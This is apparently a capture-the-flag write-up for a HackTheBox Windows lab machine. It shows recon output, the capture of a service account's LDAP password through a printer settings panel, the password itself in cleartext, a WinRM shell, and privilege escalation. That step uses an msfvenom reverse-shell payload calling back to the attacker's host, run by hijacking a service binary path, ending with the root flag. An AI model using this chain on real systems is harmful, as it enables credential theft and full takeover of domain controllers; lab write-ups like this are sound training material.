# Recon
```
─$ nmap -sC -sV 10.10.11.108 -Pn
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-03 17:32 EEST
Stats: 0:00:11 elapsed; 0 hosts completed (0 up), 0 undergoing Host Discovery
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Stats: 0:00:31 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 57.48% done; ETC: 17:33 (0:00:14 remaining)
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 99.99% done; ETC: 17:33 (0:00:00 remaining)
Stats: 0:00:46 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 80.00% done; ETC: 17:33 (0:00:02 remaining)
Nmap scan report for 10.10.11.108
Host is up (0.22s latency).
Not shown: 990 closed tcp ports (conn-refused)
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-03 13:52:24Z)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp open  tcpwrapped
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -41m17s
| smb2-time: 
|   date: 2023-08-03T13:52:39
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 65.02 seconds
```
- enum4linux
```
$ enum4linux -a 10.10.11.108
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Aug  3 17:36:27 2023

 =========================================( Target Information )=========================================
                                                                                                                                                            
Target ........... 10.10.11.108                                                                                                                             
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 10.10.11.108 )============================
                                                                                                                                                            
                                                                                                                                                            
[E] Can't find workgroup/domain                                                                                                                             
                                                                                                                                                            
                                                                                                                                                            

 ================================( Nbtstat Information for 10.10.11.108 )================================
                                                                                                                                                            
Looking up status of 10.10.11.108                                                                                                                           
No reply from 10.10.11.108

 ===================================( Session Check on 10.10.11.108 )===================================
                                                                                                                                                            
                                                                                                                                                            
[+] Server 10.10.11.108 allows sessions using username '', password ''                                                                                      
                                                                                                                                                            
                                                                                                                                                            
 ================================( Getting domain SID for 10.10.11.108 )================================
                                                                                                                                                            
Domain Name: RETURN                                                                                                                                         
Domain Sid: S-1-5-21-3750359090-2939318659-876128439

[+] Host is part of a domain (not a workgroup)                                                                                                              
                                                                                                                                                            
                                                                                                                                                            
 ===================================( OS information on 10.10.11.108 )===================================
                                                                                                                                                            
                                                                                                                                                            
[E] Can't get OS info with smbclient                                                                                                                        
                                                                                                                                                            
                                                                                                                                                            
[+] Got OS info for 10.10.11.108 from srvinfo:                                                                                                              
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED                                                                                      


 =======================================( Users on 10.10.11.108 )=======================================
                                                                                                                                                            
                                                                                                                                                            
[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIED                                                                                        
                                                                                                                                                            
                                                                                                                                                            

[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED                                                                                         
                                                                                                                                                            
                                                                                                                                                            
 =================================( Share Enumeration on 10.10.11.108 )=================================
                                                                                                                                                            
do_connect: Connection to 10.10.11.108 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)                                                                     

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.10.11.108                                                                                                                
                                                                                                                                                            
                                                                                                                                                            
 ============================( Password Policy Information for 10.10.11.108 )============================
                                                                                                                                                            
                                                                                                                                                            
[E] Unexpected error from polenum:                                                                                                                          
                                                                                                                                                            
                                                                                                                                                            

[+] Attaching to 10.10.11.108 using a NULL share

[+] Trying protocol 139/SMB...

        [!] Protocol failed: Cannot request session (Called Name:10.10.11.108)

[+] Trying protocol 445/SMB...

        [!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient                                                                                                            
                                                                                                                                                            
                                                                                                                                                            

 =======================================( Groups on 10.10.11.108 )=======================================
                                                                                                                                                            
                                                                                                                                                            
[+] Getting builtin groups:                                                                                                                                 
                                                                                                                                                            
                                                                                                                                                            
[+]  Getting builtin group memberships:                                                                                                                     
                                                                                                                                                            
                                                                                                                                                            
[+]  Getting local groups:                                                                                                                                  
                                                                                                                                                            
                                                                                                                                                            
[+]  Getting local group memberships:                                                                                                                       
                                                                                                                                                            
                                                                                                                                                            
[+]  Getting domain groups:                                                                                                                                 
                                                                                                                                                            
                                                                                                                                                            
[+]  Getting domain group memberships:                                                                                                                      
                                                                                                                                                            
                                                                                                                                                            
 ==================( Users on 10.10.11.108 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                            
                                                                                                                                                            
[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.                                                                                   
                                                                                                                                                            
                                                                                                                                                            
 ===============================( Getting printer info for 10.10.11.108 )===============================
                                                                                                                                                            
do_cmd: Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED                                                                                     


enum4linux complete on Thu Aug  3 17:37:11 2023
```
- we dont find much here and also in crackmeexec we go to the website
- Navigating to Settings reveals a username and domain name and server addres we open netcat and change server addres to our ip and press update
```
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 389                 
Listening on 0.0.0.0 389
Connection received on 10.10.11.108 63598
0*`%return\svc-printer�
                       1edFg43012!!
```
- it’s an LDAP bindRequest, with the username return\svc-printer and the simple authentication (password) of “1edFg43012!!”
- check crackmapexec with the creds found in smb and winrm and both return results
```
┌──(kali㉿kali)-[~]
└─$ crackmapexec smb 10.10.11.108 --shares -u svc-printer -p '1edFg43012!!'
SMB         10.10.11.108    445    PRINTER          [*] Windows 10.0 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:False)
SMB         10.10.11.108    445    PRINTER          [+] return.local\svc-printer:1edFg43012!! 
SMB         10.10.11.108    445    PRINTER          [+] Enumerated shares
SMB         10.10.11.108    445    PRINTER          Share           Permissions     Remark
SMB         10.10.11.108    445    PRINTER          -----           -----------     ------
SMB         10.10.11.108    445    PRINTER          ADMIN$          READ            Remote Admin
SMB         10.10.11.108    445    PRINTER          C$              READ,WRITE      Default share
SMB         10.10.11.108    445    PRINTER          IPC$            READ            Remote IPC
SMB         10.10.11.108    445    PRINTER          NETLOGON        READ            Logon server share 
SMB         10.10.11.108    445    PRINTER          SYSVOL          READ            Logon server share 
```
- since winrm return results we use evilwinrm to get shell
```
evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!'
```
- and we got a shell as user
# Privilege Escilation
- whoami /groups to find groups the user are in some groups add up after searching each group the Server Operators jumps out immediately. This group can do a lot of things
- Members of this group can start/stop system services. Let's modify a service binary path to obtain a reverse shell
- use msfvenom
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.4 LPORT=1337 -f exe > shel.exe
```
- now with evilwinrm upload it using upload command
```
upload shel.exe
```
- no go to msfconsole and use multi/handler with payload 'set PAYLOAD windows/meterpreter/reverse_tcp'
- Using the existing shell, let's modify a service binary path to obtain a reverse shell
```
sc.exe config vss binPath="C:\Users\svc-printer\Desktop\shel.exe"
```
- now to pltain rev shell
```
sc.exe stop vss
sc.exe start vss
```
- and we got a meterpeter shell with nt authority but session dies after 30 sec so we migrate to aprocces with nt authoruty and we got a stable shell
```
C:\Users\Administrator\Desktop>type root.txt
type root.txt
90c17acbba2135d8b878576d08694a64
```
